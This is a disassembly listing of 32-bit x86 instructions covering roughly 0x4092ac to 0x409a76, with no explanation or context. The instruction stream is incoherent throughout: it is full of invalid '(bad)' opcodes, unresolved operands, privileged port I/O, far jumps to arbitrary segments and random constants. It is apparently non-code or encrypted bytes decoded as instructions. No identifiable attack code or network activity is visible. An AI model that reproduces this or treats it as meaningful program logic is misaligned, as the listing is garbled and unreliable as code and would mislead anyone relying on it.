  4092ac:	jmp    0x6a2a6da4
  4092b1:	popa   
  4092b2:	push   esi
  4092b3:	stc    
  4092b4:	ss js  0x4092fa
  4092b7:	xor    BYTE PTR [esi+0x7a4cec8],cl
  4092bd:	pop    ebx
  4092be:	xor    BYTE PTR [eax+0x41],dl
  4092c1:	in     eax,0xc2
  4092c3:	fsubr  st,st(2)
  4092c5:	leave  
  4092c6:	sub    BYTE PTR [ebp-0x74],al
  4092c9:	scas   eax,DWORD PTR es:[edi]
  4092ca:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  4092cc:	jp     0x4092e2
  4092ce:	pop    edi
  4092cf:	xor    eax,DWORD PTR ss:[edx]
  4092d2:	adc    edi,DWORD PTR [eax+0x698eb494]
  4092d8:	ret    
  4092d9:	or     BYTE PTR [eax-0x7d],0xf5
  4092dd:	mov    ebx,0xf8dd774
  4092e2:	inc    edx
  4092e3:	cmp    BYTE PTR [esi+0x3e0bb40c],dl
  4092e9:	inc    ecx
  4092ea:	stos   BYTE PTR es:[edi],al
  4092eb:	repz mov edx,0x37084dac
  4092f1:	loopne 0x4092dc
  4092f3:	retf   0x49ac
  4092f6:	aas    
  4092f7:	loop   0x4092a7
  4092f9:	jbe    0x40931a
  4092fb:	imul   esi,DWORD PTR [ebp+0x24],0x7c
  4092ff:	(bad)  
  409300:	push   cs
  409301:	inc    ebp
  409302:	cmp    eax,ecx
  409304:	mov    esp,DWORD PTR [ebp-0x2400a86b]
  40930a:	ficomp WORD PTR [eax+0x5b00bb2f]
  409310:	iret   
  409311:	dec    edi
  409312:	fldenv [ebp+ebp*2-0x71]
  409316:	push   cs
  409317:	cmp    DWORD PTR [ebx],esi
  409319:	int    0xdd
  40931b:	loopne 0x409346
  40931d:	test   DWORD PTR [ecx-0x35],0x8b8c7bb5
  409324:	cwde   
  409325:	inc    edx
  409326:	sbb    DWORD PTR [ecx],0x20
  409329:	cmc    
  40932a:	dec    ecx
  40932b:	mov    esi,0xcd701379
  409330:	gs stos BYTE PTR es:[edi],al
  409332:	cmp    ebp,DWORD PTR [ebp-0x14]
  409335:	nop
  409336:	push   ds
  409337:	and    ebx,ebx
  409339:	sub    al,0x4a
  40933b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40933c:	jecxz  0x40935d
  40933e:	mov    edi,0x3b1a1b99
  409343:	inc    eax
  409344:	cmp    edx,DWORD PTR [eax-0x26]
  409347:	xchg   ebp,eax
  409348:	stos   DWORD PTR es:[edi],eax
  409349:	out    dx,eax
  40934a:	cwde   
  40934b:	not    DWORD PTR [edx+esi*8+0x5c]
  40934f:	fisubr DWORD PTR [esi]
  409351:	stc    
  409352:	jmp    0x74c9:0xeb32a436
  409359:	jmp    0x7f49:0x9cd46b41
  409360:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409361:	cld    
  409362:	mov    ch,0x9d
  409364:	sub    BYTE PTR [esi+0x1c],0xb2
  409368:	dec    edi
  409369:	jmp    0x822bbaad
  40936e:	stc    
  40936f:	cld    
  409370:	and    ebp,DWORD PTR [eax-0x7c]
  409373:	adc    DWORD PTR [edi-0x754d1898],esp
  409379:	ret    0x703a
  40937c:	or     ebp,ebx
  40937e:	adc    BYTE PTR [edi],al
  409380:	mov    es,WORD PTR [ecx+0x7e]
  409383:	fbld   TBYTE PTR [ebp-0x6a]
  409386:	cmc    
  409387:	call   0x2ef42f40
  40938c:	mov    ch,0x7d
  40938e:	jb     0x4093ab
  409390:	sbb    eax,0x56cfd406
  409395:	(bad)  
  409396:	cwde   
  409397:	adc    BYTE PTR [edx+0x19875df3],0x3a
  40939e:	add    al,0xf3
  4093a0:	dec    esp
  4093a1:	div    DWORD PTR [esi-0x61]
  4093a4:	cwde   
  4093a5:	sbb    bh,cl
  4093a7:	mov    esi,0x739a691f
  4093ac:	sub    bl,BYTE PTR [edi+0x39]
  4093af:	int3   
  4093b0:	nop
  4093b1:	mov    al,ds:0xef3b1d1c
  4093b6:	sbb    ebx,DWORD PTR [esi]
  4093b8:	jp     0x4093a5
  4093ba:	aam    0x32
  4093bc:	in     al,dx
  4093bd:	pop    ecx
  4093be:	idiv   BYTE PTR [ebx+0x65]
  4093c1:	pop    edx
  4093c2:	and    al,0x1e
  4093c4:	xchg   ebp,eax
  4093c5:	add    ebp,ebp
  4093c7:	xor    ch,dh
  4093c9:	into   
  4093ca:	pop    ds
  4093cb:	add    edx,DWORD PTR [ecx]
  4093cd:	sub    BYTE PTR [ecx+0x703197bb],ch
  4093d3:	mov    edx,eax
  4093d5:	call   edx
  4093d7:	cmp    BYTE PTR [esi-0x4d3b8fbb],ch
  4093dd:	mov    ebx,0x6310964a
  4093e2:	(bad)  
  4093e3:	addr16 (bad) 
  4093e5:	ins    DWORD PTR es:[edi],dx
  4093e6:	jns    0x409396
  4093e8:	(bad)  
  4093e9:	cs or  al,0x47
  4093ec:	div    DWORD PTR [edx+ebx*1+0x1e]
  4093f0:	out    0xae,al
  4093f2:	xchg   esp,eax
  4093f3:	jmp    0x7b90ccc1
  4093f8:	adc    ebp,DWORD PTR [edx-0x462019cd]
  4093fe:	cmp    esi,DWORD PTR [ecx-0x11]
  409401:	add    ecx,DWORD PTR [ebp+0x36]
  409404:	inc    esi
  409405:	fsubr  st(2),st
  409407:	or     dl,BYTE PTR [eax-0x21]
  40940a:	stos   DWORD PTR es:[edi],eax
  40940b:	jb     0x40947e
  40940d:	dec    esi
  40940e:	imul   DWORD PTR ds:0xe6ea1436
  409414:	dec    ebx
  409415:	(bad)  
  409417:	(bad)  
  409418:	retf   0xd8a5
  40941b:	push   es
  40941c:	in     eax,0x2
  40941e:	pusha  
  40941f:	fsubp  st(0),st
  409421:	adc    DWORD PTR [ecx+esi*1+0x2d],0xf6c33d85
  409429:	cmp    ebp,DWORD PTR [edi+0x18]
  40942c:	cmp    DWORD PTR ds:0x9cf14447,0xb9d49cbd
  409436:	js     0x409404
  409438:	mov    ebx,0xb8bbad89
  40943d:	pop    eax
  40943e:	iret   
  40943f:	dec    edi
  409440:	dec    ecx
  409441:	jp     0x4093c3
  409443:	sub    DWORD PTR [edi+0x668fded2],0x2a
  40944a:	mov    ebx,0x8da4996d
  40944f:	push   cs
  409450:	popf   
  409451:	xlat   BYTE PTR ds:[ebx]
  409452:	dec    esp
  409453:	dec    ebp
  409454:	les    ecx,FWORD PTR [edi+0x1a]
  409457:	das    
  409458:	push   ecx
  409459:	adc    ebx,esp
  40945b:	shl    DWORD PTR [eax+0x7f0cfe4f],cl
  409461:	cmp    DWORD PTR [esi],ebx
  409463:	add    BYTE PTR [esi],0xa9
  409466:	mov    dh,0x5c
  409468:	sahf   
  409469:	mov    ecx,DWORD PTR [eax-0x20]
  40946c:	clc    
  40946d:	retf   0x4114
  409470:	outs   dx,BYTE PTR ds:[esi]
  409471:	int    0x1f
  409473:	jge    0x409495
  409475:	jmp    0xf529:0xa6b8207
  40947c:	inc    ebx
  40947d:	mov    esp,esp
  40947f:	mov    BYTE PTR [esi+0x4d1d6df6],ah
  409485:	pop    esi
  409486:	test   edx,ebx
  409488:	mov    ah,0xa
  40948a:	push   edx
  40948b:	icebp  
  40948c:	pop    eax
  40948d:	loope  0x4094c1
  40948f:	aas    
  409490:	ins    BYTE PTR es:[edi],dx
  409491:	repnz adc ecx,esi
  409494:	test   DWORD PTR [edx+0xfd50d11],0xe105a2a1
  40949e:	enter  0x2c6a,0xe0
  4094a2:	dec    ecx
  4094a3:	xchg   BYTE PTR [ebx+0x7a],cl
  4094a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4094a7:	sbb    eax,0x9f77517c
  4094ac:	mov    eax,ds:0x9c70a507
  4094b1:	rcl    DWORD PTR [edx+edi*2],0x26
  4094b5:	dec    ebx
  4094b6:	ins    DWORD PTR es:[edi],dx
  4094b7:	add    dh,al
  4094b9:	xor    bl,0xf0
  4094bc:	mov    ebp,0x26f87500
  4094c1:	mov    DWORD PTR [esi-0x711ee01d],edi
  4094c7:	call   0x8bf3a115
  4094cc:	mov    cl,0x6a
  4094ce:	jmp    0x4976:0x521882ce
  4094d5:	adc    BYTE PTR [ebx+ecx*8+0x361739e6],ch
  4094dc:	test   eax,0xaaaee422
  4094e1:	ss pop ebx
  4094e3:	dec    esp
  4094e4:	push   esi
  4094e5:	mov    ds:0x3dae272,eax
  4094ea:	jae    0x4094e6
  4094ec:	mov    ds:0xd12e35dc,eax
  4094f1:	(bad)  
  4094f2:	aaa    
  4094f3:	daa    
  4094f4:	scas   eax,DWORD PTR es:[edi]
  4094f5:	jo     0x4094ed
  4094f7:	mov    cl,0x5f
  4094f9:	cmc    
  4094fa:	sbb    BYTE PTR [eax+0x3e],ah
  4094fd:	out    0x81,eax
  4094ff:	dec    esi
  409500:	cmp    ecx,ebp
  409502:	int3   
  409503:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409504:	sbb    eax,0x5559d29
  409509:	ret    
  40950a:	ins    DWORD PTR es:[edi],dx
  40950b:	add    eax,0x49dd8da5
  409510:	lock ds mov ebx,0x628380b0
  409517:	retf   0xcaeb
  40951a:	inc    esp
  40951b:	xchg   ebp,eax
  40951c:	mov    al,0xf7
  40951e:	sub    DWORD PTR [eax],ecx
  409520:	ret    0x41d1
  409523:	cmp    DWORD PTR [ebp+0x69fbd713],0x2a2a1884
  40952d:	xchg   ecx,eax
  40952e:	ins    DWORD PTR es:[edi],dx
  40952f:	adc    al,0xf1
  409531:	cmp    eax,DWORD PTR [edx]
  409533:	adc    DWORD PTR [eax],ebx
  409535:	mov    DWORD PTR [ebx+0x35],edx
  409538:	cmp    BYTE PTR [eax-0x16],0xff
  40953c:	mov    cl,0x23
  40953e:	push   edx
  40953f:	call   0xb0e41c49
  409544:	lahf   
  409545:	xlat   BYTE PTR ds:[ebx]
  409546:	cli    
  409547:	mov    eax,0xf0c687f8
  40954c:	push   eax
  40954d:	mov    bl,0x4a
  40954f:	xchg   ebp,eax
  409550:	mov    esi,0xc7a3a33c
  409555:	inc    edx
  409556:	mov    al,0x77
  409558:	stos   BYTE PTR es:[edi],al
  409559:	add    DWORD PTR [esi+0x6b],edx
  40955c:	inc    esp
  40955d:	(bad)  
  40955e:	pop    esp
  40955f:	fs add eax,0x84ce8d08
  409565:	mov    al,ds:0x2691a7b9
  40956a:	div    DWORD PTR [ebx-0xe]
  40956d:	jnp    0x4095b4
  40956f:	scas   eax,DWORD PTR es:[edi]
  409570:	sbb    ebx,DWORD PTR [ebx+0x20]
  409573:	lea    eax,[ebx-0x55]
  409576:	mov    ds:0x7be6ddde,eax
  40957b:	imul   edx,DWORD PTR [esi],0x67
  40957e:	je     0x409558
  409580:	mov    cl,0x28
  409582:	outs   dx,BYTE PTR ds:[esi]
  409583:	jb     0x409513
  409585:	ret    
  409586:	into   
  409587:	pushf  
  409588:	aas    
  409589:	or     DWORD PTR ss:[esi-0x6d90156f],0x8aabbee7
  409594:	(bad)  
  409595:	or     DWORD PTR [eax],edi
  409597:	dec    ecx
  409598:	and    BYTE PTR [esi],cl
  40959a:	cmp    ah,BYTE PTR [ebx-0x59]
  40959d:	out    0x8c,eax
  40959f:	pop    ebp
  4095a0:	(bad)  
  4095a2:	inc    ebx
  4095a3:	xor    al,0x93
  4095a5:	push   ss
  4095a6:	mov    BYTE PTR [edx],bh
  4095a8:	in     eax,0x5a
  4095aa:	pop    ds
  4095ab:	cmc    
  4095ac:	sub    DWORD PTR [edx],0xbc12a0c3
  4095b2:	out    0x8,al
  4095b4:	dec    edx
  4095b5:	jl     0x4095d8
  4095b7:	idiv   DWORD PTR [eax-0x7a7145c0]
  4095bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4095be:	outs   dx,DWORD PTR ds:[esi]
  4095bf:	sub    esi,esp
  4095c1:	lahf   
  4095c2:	push   esp
  4095c3:	sub    BYTE PTR [ebp-0x18],0x47
  4095c7:	xchg   edi,eax
  4095c8:	arpl   WORD PTR [eax+ecx*4+0x18],di
  4095cc:	mov    ecx,0x353f6ecb
  4095d1:	jnp    0x409594
  4095d3:	jl     0x409625
  4095d5:	sahf   
  4095d6:	scas   al,BYTE PTR es:[edi]
  4095d7:	lods   eax,DWORD PTR ds:[esi]
  4095d8:	add    BYTE PTR [ebp+0x26d97cba],cl
  4095de:	xchg   BYTE PTR [esi],dl
  4095e0:	out    0xf0,eax
  4095e2:	pop    esi
  4095e3:	scas   al,BYTE PTR es:[edi]
  4095e4:	les    edi,FWORD PTR [edx-0x46]
  4095e7:	or     cl,al
  4095e9:	cmp    DWORD PTR [ebx],esp
  4095eb:	inc    ebp
  4095ec:	pop    edi
  4095ed:	shl    DWORD PTR [ebx],cl
  4095ef:	loop   0x40961b
  4095f1:	xor    ebx,ebp
  4095f3:	lds    edi,FWORD PTR [esi-0x4a959f2b]
  4095f9:	sbb    DWORD PTR [eax+esi*4],ecx
  4095fc:	jmp    FWORD PTR [edx]
  4095fe:	push   ss
  4095ff:	aam    0x14
  409601:	adc    BYTE PTR [esi-0x6e],dl
  409604:	out    0xcb,eax
  409606:	jb     0x409680
  409608:	add    BYTE PTR [ecx-0x470c3f3e],bh
  40960e:	or     eax,0xc8d9392e
  409613:	mov    ebp,0xd2293766
  409618:	stc    
  409619:	pusha  
  40961a:	xor    BYTE PTR [ebp+0x10b5eb06],dl
  409620:	jp     0x4095ca
  409622:	cmc    
  409623:	(bad)  
  409624:	cmp    ch,BYTE PTR [eax]
  409626:	rol    BYTE PTR [esi+edx*1],0xdc
  40962a:	xchg   edi,eax
  40962b:	or     BYTE PTR ds:0x14ccc711,0xd4
  409632:	mov    edx,0x665d0812
  409637:	add    BYTE PTR [ebx-0x51c6b309],dl
  40963d:	arpl   dx,sp
  40963f:	out    dx,al
  409640:	push   eax
  409641:	ret    0x89cc
  409644:	dec    ebx
  409645:	xor    al,0xee
  409647:	call   0x4d90de57
  40964c:	mov    bh,0xb8
  40964e:	mov    edi,0x2656fd83
  409653:	xchg   esi,eax
  409654:	jle    0x409643
  409656:	inc    ebp
  409657:	or     DWORD PTR [ebx],esp
  409659:	pop    ebp
  40965a:	shr    DWORD PTR [edi],cl
  40965c:	push   es
  40965d:	frstor [edi+ebx*4]
  409660:	or     bh,0xd8
  409663:	xlat   BYTE PTR ds:[ebx]
  409664:	mov    esp,0x67c28d21
  409669:	out    dx,al
  40966a:	aad    0xf4
  40966c:	mov    edi,0xf2a8958e
  409671:	mov    BYTE PTR [esp+esi*8],bl
  409674:	stc    
  409675:	push   esi
  409676:	xlat   BYTE PTR ds:[ebx]
  409677:	out    dx,al
  409678:	mov    eax,0xb1e23e77
  40967d:	mov    edx,0x186a9fba
  409682:	hlt    
  409683:	aam    0x5c
  409685:	popa   
  409686:	mov    gs,WORD PTR [edi-0x4f]
  409689:	int3   
  40968a:	push   ecx
  40968b:	loopne 0x409619
  40968d:	jmp    0x409681
  40968f:	push   eax
  409690:	out    dx,al
  409691:	mov    ds:0x4e986157,eax
  409696:	pop    es
  409697:	cld    
  409698:	xchg   esp,eax
  409699:	es out 0xc1,eax
  40969c:	or     eax,edx
  40969e:	jae    0x409667
  4096a0:	jmp    0xcd1c:0x8e554f2c
  4096a7:	mov    bl,0x2
  4096a9:	daa    
  4096aa:	push   cs
  4096ab:	cmp    esp,0x166cc006
  4096b1:	jg     0x4096f1
  4096b3:	dec    esp
  4096b4:	jbe    0x409649
  4096b6:	mov    ?,WORD PTR [edx+0x4ec9bf00]
  4096bc:	ret    
  4096bd:	retf   
  4096be:	push   edi
  4096bf:	or     al,0x2e
  4096c1:	ret    
  4096c2:	mov    bh,BYTE PTR [ebp-0x7df939bc]
  4096c8:	mov    dl,0x53
  4096ca:	ffreep st(5)
  4096cc:	jb     0x4096ef
  4096ce:	jmp    DWORD PTR [edx]
  4096d0:	mov    edx,0xa5104e32
  4096d5:	xchg   edx,eax
  4096d6:	popf   
  4096d7:	jne    0x40966b
  4096d9:	cmp    eax,0x69aae4d8
  4096de:	clc    
  4096df:	pop    ds
  4096e0:	sbb    edi,ebx
  4096e2:	repnz sahf 
  4096e4:	mov    dl,0xd6
  4096e6:	pop    ds
  4096e7:	pop    eax
  4096e8:	and    DWORD PTR [ecx+0x5],0xffffffb6
  4096ec:	imul   DWORD PTR [ebp-0x12]
  4096ef:	les    ecx,FWORD PTR [ecx-0x2f743e9]
  4096f5:	sbb    BYTE PTR [ecx],bl
  4096f7:	lea    ecx,[esi]
  4096f9:	mov    al,0x2b
  4096fb:	inc    ebp
  4096fc:	out    dx,eax
  4096fd:	clc    
  4096fe:	add    cl,0x66
  409701:	or     BYTE PTR [edi-0x4c9e6f6c],al
  409707:	dec    ebx
  409708:	mov    ds:0x3007dffe,eax
  40970d:	dec    ebx
  40970e:	push   edx
  40970f:	pusha  
  409710:	inc    ebx
  409711:	mov    ah,0x14
  409713:	xcrypt-ctr (bad)
  409714:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409715:	fidiv  DWORD PTR [ecx]
  409717:	jle    0x40971a
  409719:	push   edi
  40971a:	pop    ecx
  40971b:	jp     0x40978b
  40971d:	dec    esi
  40971e:	pop    ebx
  40971f:	or     DWORD PTR [ebx+0x375fd587],eax
  409725:	or     DWORD PTR [ecx-0x55],0xffffff94
  409729:	sti    
  40972a:	(bad)  [edx+0x34]
  40972d:	test   BYTE PTR [eax-0x17],0x36
  409731:	retf   0xf3b6
  409734:	xor    al,0x97
  409736:	lea    eax,[ecx+0x72e7ff1b]
  40973c:	pop    ds
  40973d:	ret    
  40973e:	dec    edi
  40973f:	repz jne 0x4096fe
  409742:	repnz push cs
  409744:	sbb    eax,edx
  409746:	inc    ecx
  409747:	out    dx,al
  409748:	mov    eax,ds:0x249471ea
  40974d:	xlat   BYTE PTR ds:[ebx]
  40974e:	push   ds
  40974f:	sub    ch,BYTE PTR [edi]
  409751:	shl    BYTE PTR [ebx],cl
  409753:	or     bh,bl
  409755:	stos   BYTE PTR es:[edi],al
  409756:	out    0xfc,al
  409758:	sbb    DWORD PTR [ecx+0x22],eax
  40975b:	sub    eax,0xc0c483a9
  409760:	dec    esi
  409761:	shl    DWORD PTR [ebp-0x37634ecc],1
  409767:	cmp    eax,0x754f3403
  40976c:	jl     0x409729
  40976e:	or     DWORD PTR [ebp+0xe],edi
  409771:	js     0x409773
  409773:	in     al,dx
  409774:	mov    edx,0xea588af3
  409779:	hlt    
  40977a:	neg    BYTE PTR [edi+0x23049db9]
  409780:	dec    ebx
  409781:	jo     0x4097db
  409783:	xchg   edi,eax
  409784:	dec    esi
  409785:	sub    eax,0x5fac0593
  40978a:	test   BYTE PTR [edx-0x612a2cc4],bh
  409790:	and    al,0xc2
  409792:	out    dx,eax
  409793:	ins    DWORD PTR es:[edi],dx
  409794:	push   0xb4266ea5
  409799:	gs (bad) 
  40979b:	icebp  
  40979c:	ret    0x76d8
  40979f:	dec    ebp
  4097a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4097a1:	xchg   edx,eax
  4097a2:	fsubr  DWORD PTR [ebx+0x3f85e5c4]
  4097a8:	and    DWORD PTR [ecx],ecx
  4097aa:	pop    esi
  4097ab:	adc    al,0x37
  4097ad:	add    ecx,0x4d8f878e
  4097b3:	xchg   edi,eax
  4097b4:	push   esp
  4097b5:	and    al,BYTE PTR [ebp-0x4f4fc6ba]
  4097bb:	ja     0x409804
  4097bd:	jle    0x409783
  4097bf:	call   0x7bfc:0xfd29ad30
  4097c6:	lahf   
  4097c7:	mov    bh,0x9a
  4097c9:	jp     0x4097fd
  4097cb:	push   edx
  4097cc:	mov    ds:0xf21e3e93,al
  4097d1:	pop    esp
  4097d2:	xor    eax,edx
  4097d4:	imul   edx,edx,0xd
  4097d7:	jno    0x409786
  4097d9:	jmp    0x409837
  4097db:	ss cld 
  4097dd:	push   eax
  4097de:	pop    edx
  4097df:	mov    eax,ds:0x7114a64c
  4097e4:	xchg   DWORD PTR [ecx],edi
  4097e6:	and    al,0x80
  4097e8:	xchg   ecx,eax
  4097e9:	adc    DWORD PTR [edx-0x65],ebx
  4097ec:	or     DWORD PTR [ebp-0x5f3da2a1],eax
  4097f2:	stos   DWORD PTR es:[edi],eax
  4097f3:	loope  0x409794
  4097f5:	mov    WORD PTR [eax+0x5a],?
  4097f8:	mov    ah,0xa5
  4097fa:	jge    0x4097f1
  4097fc:	sbb    dl,cl
  4097fe:	sub    eax,0xa090839
  409803:	jl     0x409847
  409805:	jp     0x409822
  409807:	scas   eax,DWORD PTR es:[edi]
  409808:	fwait
  409809:	aad    0x48
  40980b:	and    esi,DWORD PTR [eax+0x303da41e]
  409811:	jge    0x40983d
  409813:	bound  ecx,QWORD PTR [ebx+0x27]
  409816:	xchg   esp,eax
  409817:	test   eax,0x693c2285
  40981c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40981d:	push   ss
  40981e:	dec    esi
  40981f:	outs   dx,BYTE PTR ds:[esi]
  409820:	add    bl,dh
  409822:	pop    ecx
  409823:	mov    ecx,0x708916f1
  409828:	xchg   DWORD PTR [ecx+0x3fa365d4],ecx
  40982e:	adc    eax,0x93ff00ac
  409833:	push   esi
  409834:	loop   0x4097d8
  409836:	push   es
  409837:	int3   
  409838:	jb     0x40989c
  40983a:	jge    0x409836
  40983c:	call   DWORD PTR [ecx+ecx*8-0x6558568e]
  409843:	or     BYTE PTR [ecx+0x64],al
  409846:	leave  
  409847:	mov    eax,ds:0xe77284d9
  40984c:	push   edx
  40984d:	jo     0x4097d5
  40984f:	(bad)  
  409850:	fist   WORD PTR [esi+0x980562f]
  409856:	inc    cx
  409858:	sub    ah,BYTE PTR [edi+0x53a6324c]
  40985e:	pop    esi
  40985f:	std    
  409860:	ret    0x9db5
  409863:	push   ecx
  409864:	in     al,0xf9
  409866:	inc    ebp
  409867:	sub    esi,edx
  409869:	mov    edi,0xa5653861
  40986e:	jo     0x4097f5
  409870:	fnsave [esi-0x3f]
  409873:	scas   eax,DWORD PTR es:[edi]
  409874:	jmp    0x9fc92918
  409879:	sub    BYTE PTR [edx-0x337460be],bl
  40987f:	lods   al,BYTE PTR ds:[esi]
  409880:	rol    DWORD PTR [ecx+ecx*4+0x4],1
  409884:	cld    
  409885:	xchg   esp,eax
  409886:	sbb    bl,BYTE PTR [ebx]
  409888:	aad    0xc
  40988a:	sbb    BYTE PTR [ecx-0x53],bl
  40988d:	data16 test al,0x8e
  409890:	pushf  
  409891:	push   edi
  409892:	enter  0x7f3f,0xc5
  409896:	xlat   BYTE PTR ds:[ebx]
  409897:	sub    edi,esp
  409899:	lds    ecx,FWORD PTR [ecx]
  40989b:	and    al,BYTE PTR [edx]
  40989d:	push   esi
  40989e:	jge    0x409866
  4098a0:	inc    ebx
  4098a1:	mov    cl,0x69
  4098a3:	cmp    dl,dh
  4098a5:	lods   al,BYTE PTR ds:[esi]
  4098a6:	xchg   esp,eax
  4098a7:	xor    DWORD PTR [ebp+ecx*8-0x1b],ebp
  4098ab:	mov    eax,?
  4098ad:	cmp    eax,0xcf6b5927
  4098b2:	sub    sp,sp
  4098b5:	cli    
  4098b6:	(bad)  [edx]
  4098b8:	adc    eax,0xf0515708
  4098bd:	loopne 0x409872
  4098bf:	pop    ecx
  4098c0:	mov    dl,0x7f
  4098c2:	leave  
  4098c3:	push   ebx
  4098c4:	imul   eax,ecx,0xb806d132
  4098ca:	dec    edx
  4098cb:	loop   0x409851
  4098cd:	fcmovnb st,st(7)
  4098cf:	pop    eax
  4098d0:	sub    DWORD PTR [ebx-0x41],ebp
  4098d3:	sub    esp,esp
  4098d5:	(bad)  
  4098d6:	stc    
  4098d7:	mov    edi,0x896f3ed5
  4098dc:	mov    BYTE PTR [edx],0x16
  4098df:	dec    edi
  4098e0:	ficomp WORD PTR [ecx]
  4098e2:	or     al,BYTE PTR [edi-0x6370629c]
  4098e8:	repnz jecxz 0x40990d
  4098eb:	dec    esi
  4098ec:	cdq    
  4098ed:	in     eax,0xe1
  4098ef:	push   esi
  4098f0:	rcl    BYTE PTR ss:[edx+ecx*2],cl
  4098f4:	fdiv   st(3),st
  4098f6:	cmp    al,0x34
  4098f8:	and    eax,0xdc23906
  4098fd:	fstp   TBYTE PTR [eax+0x5b]
  409900:	neg    BYTE PTR [ebx+ebp*1-0x514b466]
  409907:	int3   
  409908:	pop    es
  409909:	arpl   WORD PTR [ecx-0x233a1b3d],sp
  40990f:	mov    esi,0x6d555295
  409914:	hlt    
  409915:	cld    
  409916:	call   0x39fe98af
  40991b:	hlt    
  40991c:	xor    al,0x1a
  40991e:	fimul  WORD PTR [eax+0x27]
  409921:	and    bh,BYTE PTR [edx+0x2c57c74c]
  409927:	jne    0x40996e
  409929:	into   
  40992a:	push   esp
  40992b:	and    DWORD PTR [edi-0x52],ebp
  40992e:	icebp  
  40992f:	test   eax,0xc1655f41
  409934:	pop    esi
  409935:	pusha  
  409936:	out    0xf9,eax
  409938:	ins    DWORD PTR es:[edi],dx
  409939:	ret    
  40993a:	pushf  
  40993b:	sub    al,0x1e
  40993d:	mov    edi,ebx
  40993f:	adc    DWORD PTR [edx+eiz*4+0x4fe2a2a6],edx
  409946:	jmp    0x813d:0xb2631c6
  40994d:	out    0xb5,eax
  40994f:	xor    dh,dl
  409951:	fwait
  409952:	rcr    BYTE PTR [ebx-0x6c],1
  409955:	test   BYTE PTR [esi],ah
  409957:	fst    DWORD PTR [esi+ebx*2]
  40995a:	dec    esp
  40995b:	pusha  
  40995c:	lods   al,BYTE PTR ds:[esi]
  40995d:	jecxz  0x4098e3
  40995f:	pushf  
  409960:	adc    esi,0xffffffeb
  409963:	pop    ss
  409964:	lock xchg edi,eax
  409966:	fcmovnu st,st(0)
  409968:	test   eax,0x2c1100ec
  40996d:	xchg   BYTE PTR [edx+0x59],dl
  409970:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409971:	add    eax,0xa3f67e66
  409976:	cli    
  409977:	jle    0x409960
  409979:	sbb    BYTE PTR ss:[ebx],0x9f
  40997d:	pop    ebx
  40997e:	outs   dx,DWORD PTR ds:[esi]
  40997f:	jg     0x409961
  409981:	jb     0x409950
  409983:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409985:	cmp    BYTE PTR [eax-0x28],bl
  409988:	sub    al,0xd
  40998a:	clc    
  40998b:	nop
  40998c:	int    0x8d
  40998e:	pop    ss
  40998f:	fldcw  WORD PTR [eax-0x5e]
  409992:	xchg   ebx,eax
  409993:	inc    cx
  409995:	ds out 0xe,eax
  409998:	push   eax
  409999:	xchg   edi,eax
  40999a:	adc    eax,0xb171411d
  40999f:	sub    esp,esp
  4099a1:	xchg   ecx,eax
  4099a2:	and    DWORD PTR [ecx-0x59],ebx
  4099a5:	mov    ds:0x5db0d1d0,al
  4099aa:	jg     0x4099c7
  4099ac:	mov    eax,0x2488a8d8
  4099b1:	in     eax,0x7a
  4099b3:	xor    DWORD PTR [esi+0x27],esp
  4099b6:	cmp    BYTE PTR [ecx+0x7a],ah
  4099b9:	inc    edx
  4099ba:	dec    esp
  4099bb:	or     al,0x65
  4099bd:	mov    eax,ds:0xd26abab4
  4099c2:	dec    esi
  4099c3:	pop    es
  4099c4:	out    0x2f,al
  4099c6:	stos   BYTE PTR es:[edi],al
  4099c7:	std    
  4099c8:	stos   DWORD PTR es:[edi],eax
  4099c9:	fld    QWORD PTR [ebp+0x19]
  4099cc:	nop
  4099cd:	int3   
  4099ce:	mov    al,ds:0x2a6873f5
  4099d3:	mov    al,ds:0x4ecbaa63
  4099d8:	rcr    eax,cl
  4099da:	adc    eax,0x695b4623
  4099df:	cs lahf 
  4099e1:	lds    ebx,FWORD PTR [edx+esi*4-0x585c0277]
  4099e8:	out    0xea,eax
  4099ea:	xchg   ecx,eax
  4099eb:	xchg   ebp,eax
  4099ec:	and    BYTE PTR [esi-0x4c05e933],0x54
  4099f3:	popw   ss
  4099f5:	xor    ebx,esi
  4099f7:	cmp    eax,0x970d53e2
  4099fc:	mov    al,ds:0x73248fc0
  409a01:	mov    eax,ds:0xce606700
  409a06:	jbe    0x409a69
  409a08:	popa   
  409a09:	fwait
  409a0a:	mov    al,0x62
  409a0c:	xchg   ecx,eax
  409a0d:	inc    eax
  409a0e:	xchg   edx,eax
  409a0f:	mov    ebp,0x7489a0e
  409a14:	mul    edx
  409a16:	adc    eax,0x2bbbea9a
  409a1b:	push   esi
  409a1c:	sub    ah,BYTE PTR [edx+eiz*4-0x53]
  409a20:	cmp    al,0xd
  409a22:	or     cl,BYTE PTR [esi]
  409a24:	and    al,0xcf
  409a26:	inc    edx
  409a27:	mov    al,0x17
  409a29:	inc    esi
  409a2a:	inc    eax
  409a2b:	ja     0x409a29
  409a2d:	arpl   WORD PTR [esi+esi*8-0x46aeeea],ax
  409a34:	leave  
  409a35:	int    0x76
  409a37:	adc    DWORD PTR [esi+edi*8-0x33465ab4],0x2fb2d905
  409a42:	movntq QWORD PTR [ecx],mm7
  409a45:	fnstenv [ebp+0x6e2ab63c]
  409a4b:	xchg   ebx,eax
  409a4c:	add    ah,BYTE PTR [edx]
  409a4e:	rcl    ebp,cl
  409a50:	mov    ds:0xd52de0d7,al
  409a55:	ret    
  409a56:	jbe    0x409ab4
  409a58:	ret    0xe003
  409a5b:	and    dh,BYTE PTR [esp+ebp*8+0x73]
  409a5f:	pop    edx
  409a60:	lods   eax,DWORD PTR ds:[esi]
  409a61:	sbb    al,0x92
  409a63:	sbb    DWORD PTR [esi+ebx*4],edx
  409a66:	mov    al,0x81
  409a68:	dec    BYTE PTR [ecx*1-0x5865d832]
  409a6f:	sar    DWORD PTR [edi-0x28c54ab0],1
  409a75:	leave  
  409a76:	imul   ebx,DWORD PTR [edx-0x2f],0x6659fabe
